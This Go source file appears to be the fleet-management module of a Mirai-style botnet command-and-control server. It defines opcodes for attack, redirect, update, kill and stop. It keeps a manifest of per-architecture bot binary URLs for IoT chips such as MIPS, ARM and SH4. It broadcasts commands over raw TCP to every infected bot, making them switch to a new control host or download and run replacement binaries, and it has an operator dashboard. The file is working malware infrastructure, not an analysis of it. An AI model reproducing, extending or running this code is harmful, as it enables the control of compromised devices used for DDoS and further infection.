package main

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	cncOpAttack   = 0x00
	cncOpRedirect = 0x01
	cncOpUpdate   = 0x02
	cncOpReload   = 0x03
	cncOpKill     = 0x04
	cncOpPing     = 0x05
	cncOpAck      = 0x06
	cncOpStop     = 0x07
	cncOpReport   = 0x08

	manifestFile        = "manifest.json"
	fleetUpdateCooldown   = 10 * time.Second
)

var archIDToName = map[uint8]string{
	0:  "unknown",
	1:  "mips",
	2:  "mipsel",
	3:  "arm",
	4:  "arm5",
	5:  "arm6",
	6:  "arm7",
	7:  "x86",
	8:  "x86_64",
	9:  "ppc",
	10: "sh4",
	11: "arc",
	12: "sda",
	13: "mtd",
}

type ManifestBin struct {
	URL    string `json:"url"`
	SHA256 string `json:"sha256"`
}

type ManifestRedirect struct {
	Host string `json:"host"`
	Port int    `json:"port"`
}

type FleetManifest struct {
	Version  int                       `json:"version"`
	Redirect *ManifestRedirect         `json:"redirect,omitempty"`
	Bins     map[string]ManifestBin    `json:"bins"`
}

type FleetStats struct {
	TotalOnline int            `json:"total_online"`
	ByVersion   map[uint8]int  `json:"by_version"`
	ByArch      map[string]int `json:"by_arch"`
}

type FleetActionResult struct {
	Sent    int            `json:"sent"`
	Skipped int            `json:"skipped"`
	Errors  int            `json:"errors"`
	Details map[string]int `json:"details,omitempty"`
}

type fleetManager struct {
	mu         sync.RWMutex
	manifest   FleetManifest
	updateGate map[int]time.Time
	updateMu   sync.Mutex
}

var fleet = &fleetManager{updateGate: make(map[int]time.Time)}

func handleBotAck(bot *Bot, payload []byte) {
	if len(payload) < 3 {
		return
	}
	refOp := payload[1]
	status := payload[2]
	statusLabel := "ok"
	if status != 0 {
		statusLabel = "fail"
	}
	fmt.Printf("\x1b[1;36m[ ACK ] \x1b[38;5;99mbot=%s arch=%s op=0x%02x status=%s\x1b[0m\n",
		bot.id, bot.ArchName(), refOp, statusLabel)
}

func handleBotReport(bot *Bot, payload []byte) {
	if len(payload) < 3 {
		return
	}
	rtype := payload[1]
	dataLen := int(payload[2])
	if dataLen < 0 || 3+dataLen > len(payload) {
		return
	}
	text := string(payload[3 : 3+dataLen])
	fmt.Printf("\x1b[1;33m[ REPORT ] \x1b[38;5;99mbot=%s arch=%s type=%d \x1b[38;5;27m%s\x1b[0m\n",
		bot.id, bot.ArchName(), rtype, text)
}

func (f *fleetManager) allowFleetUpdate(botUID int) bool {
	f.updateMu.Lock()
	defer f.updateMu.Unlock()

	now := time.Now()
	if t, ok := f.updateGate[botUID]; ok && now.Sub(t) < fleetUpdateCooldown {
		return false
	}
	f.updateGate[botUID] = now
	return true
}

func init() {
	_ = fleet.ReloadManifest()
}

func (f *fleetManager) ReloadManifest() error {
	data, err := os.ReadFile(manifestFile)
	if err != nil {
		if os.IsNotExist(err) {
			f.mu.Lock()
			f.manifest = FleetManifest{Version: 2, Bins: make(map[string]ManifestBin)}
			f.mu.Unlock()
			return nil
		}
		return err
	}
	var m FleetManifest
	if err := json.Unmarshal(data, &m); err != nil {
		return err
	}
	if m.Bins == nil {
		m.Bins = make(map[string]ManifestBin)
	}
	f.mu.Lock()
	f.manifest = m
	f.mu.Unlock()
	return nil
}

func (f *fleetManager) Manifest() FleetManifest {
	f.mu.RLock()
	defer f.mu.RUnlock()
	return f.manifest
}

func buildFleetPacket(opcode byte, body []byte) []byte {
	payload := make([]byte, 1+len(body))
	payload[0] = opcode
	copy(payload[1:], body)
	pkt := make([]byte, 2+len(payload))
	binary.BigEndian.PutUint16(pkt[0:2], uint16(len(payload)))
	copy(pkt[2:], payload)
	return pkt
}

func buildRedirectBody(host string, port int) ([]byte, error) {
	ip := net.ParseIP(strings.TrimSpace(host))
	if ip == nil {
		return buildRedirectDomainBody(host, port)
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, errors.New("redirect host must be IPv4 or domain")
	}
	body := make([]byte, 7)
	body[0] = 0
	copy(body[1:5], ip4)
	binary.BigEndian.PutUint16(body[5:7], uint16(port))
	return body, nil
}

func buildRedirectDomainBody(host string, port int) ([]byte, error) {
	host = strings.TrimSpace(host)
	if host == "" || len(host) > 255 {
		return nil, errors.New("invalid redirect domain")
	}
	body := make([]byte, 2+len(host)+2)
	body[0] = 1
	body[1] = byte(len(host))
	copy(body[2:], host)
	binary.BigEndian.PutUint16(body[2+len(host):], uint16(port))
	return body, nil
}

func buildUpdateBody(url string, minVersion uint8, force bool, hash []byte) ([]byte, error) {
	if url == "" || len(url) > 255 {
		return nil, errors.New("invalid update url")
	}
	forceByte := byte(0)
	if force {
		forceByte = 1
	}
	body := make([]byte, 1+len(url)+2+1+len(hash))
	off := 0
	body[off] = byte(len(url))
	off++
	copy(body[off:], url)
	off += len(url)
	body[off] = minVersion
	off++
	body[off] = forceByte
	off++
	if len(hash) > 0 {
		if len(hash) > 32 {
			return nil, errors.New("hash too long")
		}
		body[off] = byte(len(hash))
		off++
		copy(body[off:], hash)
		off += len(hash)
	}
	return body[:off], nil
}

func decodeManifestHash(hexStr string) []byte {
	hexStr = strings.TrimSpace(hexStr)
	if hexStr == "" {
		return nil
	}
	if len(hexStr)%2 != 0 {
		return nil
	}
	out := make([]byte, len(hexStr)/2)
	for i := 0; i < len(out); i++ {
		var b byte
		_, err := fmt.Sscanf(hexStr[i*2:i*2+2], "%02x", &b)
		if err != nil {
			return nil
		}
		out[i] = b
	}
	return out
}

func (b *Bot) ArchName() string {
	if name, ok := archIDToName[b.arch]; ok {
		return name
	}
	return "unknown"
}

func collectFleetStats() FleetStats {
	stats := FleetStats{
		ByVersion: make(map[uint8]int),
		ByArch:    make(map[string]int),
	}
	for _, bot := range clientList.AllClients() {
		stats.TotalOnline++
		stats.ByVersion[bot.version]++
		stats.ByArch[bot.ArchName()]++
	}
	return stats
}

type fleetBotFilter struct {
	VersionLT *uint8
	Arch      *uint8
}

func botMatchesFilter(bot *Bot, filter fleetBotFilter) bool {
	if filter.VersionLT != nil && bot.version >= *filter.VersionLT {
		return false
	}
	if filter.Arch != nil && bot.arch != *filter.Arch {
		return false
	}
	return true
}

func fleetSendPacket(bot *Bot, pkt []byte) error {
	_, err := bot.conn.Write(pkt)
	return err
}

func fleetBroadcastRedirect(host string, port int) (FleetActionResult, error) {
	body, err := buildRedirectBody(host, port)
	if err != nil {
		return FleetActionResult{}, err
	}
	pkt := buildFleetPacket(cncOpRedirect, body)
	res := FleetActionResult{Details: make(map[string]int)}
	for _, bot := range clientList.AllClients() {
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
		res.Details[bot.ArchName()]++
	}
	return res, nil
}

func fleetBroadcastUpdate(opts struct {
	Force      bool
	VersionLT  *uint8
	UseManifest bool
}) (FleetActionResult, error) {
	manifest := fleet.Manifest()
	res := FleetActionResult{Details: make(map[string]int)}
	minVersion := uint8(manifest.Version)
	if minVersion == 0 {
		minVersion = 2
	}

	for _, bot := range clientList.AllClients() {
		if opts.VersionLT != nil && bot.version >= *opts.VersionLT {
			res.Skipped++
			continue
		}
		if !opts.Force && opts.VersionLT == nil && bot.version >= minVersion {
			res.Skipped++
			continue
		}
		if !fleet.allowFleetUpdate(bot.uid) {
			res.Skipped++
			continue
		}

		archName := bot.ArchName()
		bin, ok := manifest.Bins[archName]
		if !ok || strings.TrimSpace(bin.URL) == "" {
			res.Skipped++
			continue
		}

		hash := decodeManifestHash(bin.SHA256)
		body, err := buildUpdateBody(bin.URL, minVersion, opts.Force, hash)
		if err != nil {
			res.Errors++
			continue
		}
		pkt := buildFleetPacket(cncOpUpdate, body)
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
		res.Details[archName]++
	}
	return res, nil
}

func fleetBroadcastReload() FleetActionResult {
	pkt := buildFleetPacket(cncOpReload, nil)
	res := FleetActionResult{Details: make(map[string]int)}
	for _, bot := range clientList.AllClients() {
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
		res.Details[bot.ArchName()]++
	}
	return res
}

func fleetBroadcastStop() FleetActionResult {
	pkt := buildFleetPacket(cncOpStop, nil)
	res := FleetActionResult{Details: make(map[string]int)}
	for _, bot := range clientList.AllClients() {
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
		res.Details[bot.ArchName()]++
	}
	return res
}

func fleetBroadcastKill() FleetActionResult {
	pkt := buildFleetPacket(cncOpKill, nil)
	res := FleetActionResult{Details: make(map[string]int)}
	for _, bot := range clientList.AllClients() {
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
		res.Details[bot.ArchName()]++
	}
	return res
}

func fleetBroadcastPing() FleetActionResult {
	pkt := buildFleetPacket(cncOpPing, nil)
	res := FleetActionResult{Details: make(map[string]int)}
	for _, bot := range clientList.AllClients() {
		if err := fleetSendPacket(bot, pkt); err != nil {
			res.Errors++
			continue
		}
		res.Sent++
	}
	return res
}

func writeFleetDashboard(conn net.Conn) {
	stats := collectFleetStats()
	manifest := fleet.Manifest()

	conn.Write([]byte("\033[2J\033[1H"))
	conn.Write([]byte("\x1b[1;37mFLEET DASHBOARD\x1b[0m\r\n\r\n"))
	conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Online bots       \x1b[38;5;27m%d\r\n", stats.TotalOnline)))
	conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m Manifest version  \x1b[38;5;27m%d\r\n", manifest.Version)))

	conn.Write([]byte("\r\n\x1b[1;37mBY VERSION\x1b[0m\r\n"))
	if len(stats.ByVersion) == 0 {
		conn.Write([]byte("\x1b[38;5;27m (none)\r\n"))
	} else {
		for ver, count := range stats.ByVersion {
			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m v%-3d             \x1b[38;5;27m%d\r\n", ver, count)))
		}
	}

	conn.Write([]byte("\r\n\x1b[1;37mBY ARCH\x1b[0m\r\n"))
	if len(stats.ByArch) == 0 {
		conn.Write([]byte("\x1b[38;5;27m (none)\r\n"))
	} else {
		for arch, count := range stats.ByArch {
			url := "-"
			if bin, ok := manifest.Bins[arch]; ok && bin.URL != "" {
				url = bin.URL
			}
			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m %-10s        \x1b[38;5;27m%-4d \x1b[38;5;231m%s\r\n", arch, count, url)))
		}
	}

	if manifest.Redirect != nil {
		conn.Write([]byte(fmt.Sprintf("\r\n\x1b[38;5;99m Manifest redirect \x1b[38;5;27m%s:%d\r\n",
			manifest.Redirect.Host, manifest.Redirect.Port)))
	}
}

func writeFleetManifest(conn net.Conn) {
	manifest := fleet.Manifest()
	data, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		conn.Write([]byte("\x1b[38;5;99mFailed to encode manifest\r\n"))
		return
	}
	conn.Write([]byte("\033[2J\033[1H"))
	conn.Write([]byte("\x1b[1;37mFLEET MANIFEST\x1b[0m\r\n\r\n"))
	conn.Write(append(data, '\r', '\n'))
}

func handleFleetAdminCommand(conn net.Conn, parts []string) bool {
	if len(parts) == 0 {
		return false
	}
	lower := strings.ToLower(parts[0])
	if lower != "fleet" {
		return false
	}

	if len(parts) == 1 {
		writeFleetDashboard(conn)
		return true
	}

	sub := strings.ToLower(parts[1])
	switch sub {
	case "stats", "dashboard":
		writeFleetDashboard(conn)
		return true

	case "manifest":
		if len(parts) >= 3 && strings.ToLower(parts[2]) == "reload" {
			if err := fleet.ReloadManifest(); err != nil {
				conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mManifest reload failed: %v\r\n", err)))
			} else {
				conn.Write([]byte("\x1b[38;5;27mManifest reloaded\r\n"))
			}
			return true
		}
		writeFleetManifest(conn)
		return true

	case "redirect":
		host := ""
		port := 0
		if len(parts) >= 3 && strings.ToLower(parts[2]) == "all" {
			m := fleet.Manifest().Redirect
			if m == nil || m.Host == "" || m.Port <= 0 {
				conn.Write([]byte("\x1b[38;5;99mManifest has no redirect target\r\n"))
				return true
			}
			host, port = m.Host, m.Port
		} else if len(parts) >= 4 {
			host = parts[2]
			p, err := strconv.Atoi(parts[3])
			if err != nil || p <= 0 || p > 65535 {
				conn.Write([]byte("\x1b[38;5;99musage: fleet redirect <ip|domain> <port>\r\n"))
				return true
			}
			port = p
		} else {
			conn.Write([]byte("\x1b[38;5;99musage: fleet redirect <ip|domain> <port> | fleet redirect all\r\n"))
			return true
		}
		res, err := fleetBroadcastRedirect(host, port)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mRedirect failed: %v\r\n", err)))
			return true
		}
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mRedirect sent to %d bots (%d errors, %d skipped)\r\n",
			res.Sent, res.Errors, res.Skipped)))
		return true

	case "update":
		if len(parts) < 3 {
			conn.Write([]byte("\x1b[38;5;99musage: fleet update all|v1|force\r\n"))
			return true
		}
		mode := strings.ToLower(parts[2])
		opts := struct {
			Force       bool
			VersionLT   *uint8
			UseManifest bool
		}{UseManifest: true}

		switch mode {
		case "all":
		case "v1":
			v := uint8(fleet.Manifest().Version)
			if v == 0 {
				v = 2
			}
			opts.VersionLT = &v
		case "force":
			opts.Force = true
		default:
			conn.Write([]byte("\x1b[38;5;99musage: fleet update all|v1|force\r\n"))
			return true
		}

		res, err := fleetBroadcastUpdate(opts)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mUpdate failed: %v\r\n", err)))
			return true
		}
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mUpdate sent to %d bots (%d skipped, %d errors)\r\n",
			res.Sent, res.Skipped, res.Errors)))
		return true

	case "stop":
		res := fleetBroadcastStop()
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mStop sent to %d bots (%d errors)\r\n", res.Sent, res.Errors)))
		return true

	case "reload":
		if len(parts) < 3 || strings.ToLower(parts[2]) != "all" {
			conn.Write([]byte("\x1b[38;5;99musage: fleet reload all\r\n"))
			return true
		}
		res := fleetBroadcastReload()
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mReload sent to %d bots (%d errors)\r\n", res.Sent, res.Errors)))
		return true

	case "kill":
		if len(parts) < 3 || strings.ToLower(parts[2]) != "all" {
			conn.Write([]byte("\x1b[38;5;99musage: fleet kill all\r\n"))
			return true
		}
		res := fleetBroadcastKill()
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mKill sent to %d bots (%d errors)\r\n", res.Sent, res.Errors)))
		return true

	case "ping":
		res := fleetBroadcastPing()
		conn.Write([]byte(fmt.Sprintf("\x1b[38;5;27mPing sent to %d bots (%d errors)\r\n", res.Sent, res.Errors)))
		return true

	default:
		conn.Write([]byte("\x1b[38;5;99musage: fleet [stats|manifest|redirect|update|reload|stop|kill|ping] ...\r\n"))
		return true
	}
}
